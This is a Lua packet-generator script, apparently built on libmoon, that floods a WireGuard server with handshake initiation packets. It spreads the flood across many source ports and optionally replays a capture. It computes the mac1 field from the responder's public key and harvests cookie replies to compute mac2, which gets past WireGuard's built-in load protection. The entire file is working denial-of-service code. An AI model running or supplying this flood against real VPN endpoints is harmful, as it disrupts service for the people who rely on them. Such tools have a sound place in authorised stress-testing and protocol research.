--- A simple WG initiation flood
local lm     = require "libmoon"
local log    = require "log"
local memory = require "memory"
local pcap   = require "pcap"
local arp    = require "proto.arp"

local wireguard = require "proto.wireguard"

local attack = require "attack"

local ffi = require "ffi"
local fieldModifier = require "fieldModifier"

local PKT_LEN = 190

-- the configure function is called on startup with a pre-initialized command line parser
function configure(parser)
        attack.configure_pars(parser)
        parser:description("WireGuard handshake initiation packet flooding.")
	parser:option("--flows", "Number of flows used in the flood by using different source ports. 0 results in 65535 flows (max port count)."):args(1):convert(tonumber):default(1)
	parser:option("--replayPcap", "Pcap file to be replayed."):args(1)
        parser:option("--pubkey", "Calculate mac1. Requires publickey of responder."):args(1)

        parser:option("--calcMac2", "Calculates mac2 after receiving cookie responses. Requires Pulickey of responder.")

        return parser:parse()
end

master = attack.main

local taskRunning = attack.taskRunning

local createWGInitPkt, createWGInitPkts

function txTask(threadId, queue, args)
        log:info("Start txTask.")
        
	local mempool = memory:createMemPool()
        local bufs = mempool:bufArray()

        local flowCounter = 0
        local wgInitPkts = createWGInitPkts(args, mempool)

        attack.txTask_sync_start(args)

        local cookieUpdateTimer
        if args.calcMac2 then
                cookieUpdateTimer = time() + 1
        end

        while taskRunning(args) do -- check if Ctrl+c was pressed

                if cookieUpdateTimer and cookieUpdateTimer < time() then
                        -- update packets (i.e., mac2) only sometimes
                        wgInitPkts = createWGInitPkts(args, mempool)
                        cookieUpdateTimer = time() + 20
                end

                bufs:alloc(PKT_LEN)

                for i, buf in ipairs(bufs) do

                        local pkt = buf:getWireguardInitiationPacket()

                        

                        if args.flows then
                                ffi.copy(pkt, wgInitPkts[flowCounter + 1], PKT_LEN)
                                flowCounter = (flowCounter + 1) % args.flows
                        else
                                ffi.copy(pkt, wgInitPkts[1], PKT_LEN)
                        end
                        
                        attack.txTask_setChecksumOffloading(buf, args)
                end
                attack.txTask_send(queue, bufs)                
        end

	log:info("Terminate txTask.")
end

function createWGInitPkt(args, mempool)
        -- raw packet
        local res = ffi.new("uint8_t [?]", PKT_LEN)

        local buf

        if args.replayPcap then
                local pcapReader = pcap:newReader(args.replayPcap)
                buf = pcapReader:readSingle(mempool)
                pcapReader:close()
        else
                -- Need buffer to create Wireguard initiation packet stack.
                -- TODO: find a way to cast buffer directly to WG init pkt stack.
                -- allocate one buffer (wireguard initiation packet size).
                local bufArray = mempool:bufArray()
                bufArray:alloc(PKT_LEN, 1)
                buf = bufArray[1]
                args.pktLength = PKT_LEN
                buf:getWireguardInitiationPacket():fill(args)
        end

        attack.modifyPkt(buf, args)

        -- Wireguard fields
        local pkt = buf:getWireguardInitiationPacket()        
        if args.mac1 then
                pkt.wireguard:setMac1(args.mac1)
        end

        if args.pubkey then
                pkt.wireguard:calculateMac1(args.pubkey)
        end

        if args.calcMac2 then
                -- store mac1 and pubkey with the sender id as key
                wireguard.storeMac1(buf, args.calcMac2)

                -- check if a cookie value is available
                local key = wireguard.getCookieKey(pkt.ip4:getSrc(), pkt.udp:getSrcPort(), pkt.wireguard:getSender())

                local cookie, timestamp = wireguard.lookupCookie(key)
                if cookie then
                        pkt.wireguard:calculateMac2(cookie)
                end
        end

        -- similar to pkt:setRawPacket
        ffi.copy(res, pkt, PKT_LEN)

        buf:free()

        return res, PKT_LEN
end

function createWGInitPkts(args, mempool)
        local wgInitPkts = {}

	if args.flows and args.flows > 1 then
                local argsUdpSrcOld = args.udpSrc
                for i = 1, args.flows do
                        args.udpSrc = argsUdpSrcOld + (i - 1)
                        wgInitPkts[i] = createWGInitPkt(args, mempool)
                end
                args.udpSrc = argsUdpSrcOld
        else
                wgInitPkts[1] = createWGInitPkt(args, mempool)
        end

        return wgInitPkts
end

function rxTask(threadId, queue, args)
	log:info("Started rxTask.")
        local bufs = memory.bufArray()

        -- REQUIRED for outputPcap
        local pcapWriter
        if args.outputPcap then
                pcapWriter = pcap:newWriter(args.outputPcap .. threadId .. ".pcap")
        end

        -- attack.txTask_sync_start(args)

    -- exit loop with a 2 second delay
        while lm.running(2000) do
                local rx = queue:tryRecv(bufs, 100)
                -- REQUIRED for outputPcap
                local batchTime = lm.getTime()

                for i = 1, rx do
                        local buf = bufs[i]

                        -- REQUIRED for outputPcap
                        if pcapWriter then
                                pcapWriter:writeBuf(batchTime, buf, 120)
                        end

                        if args.arpID and buf:getEthernetPacket().eth:getType() == eth.TYPE_ARP then
                                -- inject arp packets to the ARP task
                                -- this is done this way instead of using filters to also dump ARP packets here
                                arp.handlePacket(buf, args.arpID)
                        else
                                if args.calcMac2 then
                                        local pkt = buf:getWireguardPacket()
                                        if pkt.wireguard:getType() == wireguard.TYPE_COOKIE then
                                                pkt = buf:getWireguardCookiePacket()

                                                local key = wireguard.getCookieKey(pkt.ip4:getDst(), pkt.udp:getDstPort())
                                                local cookie, timestamp = wireguard.lookupCookie(key)
                                                -- only update cookie value if there is not one yet
                                                -- or if the last cookie value was updated more than 60 seconds ago
                                                if not cookie or timestamp + 60 > time() then
                                                        wireguard.handleCookiePacket(buf, args.calcMac2)
                                                end
                                        end
                                end

                                -- do not free packets handlet by the ARP task, this is done by the arp task
                                buf:free()
                        end
                end
        end

        -- REQUIRED for outputPcap
        if pcapWriter then
                log:info("Flushing buffers, this can take a while...")
                pcapWriter:close()
        end

        log:info("Terminate rxTask.")
end
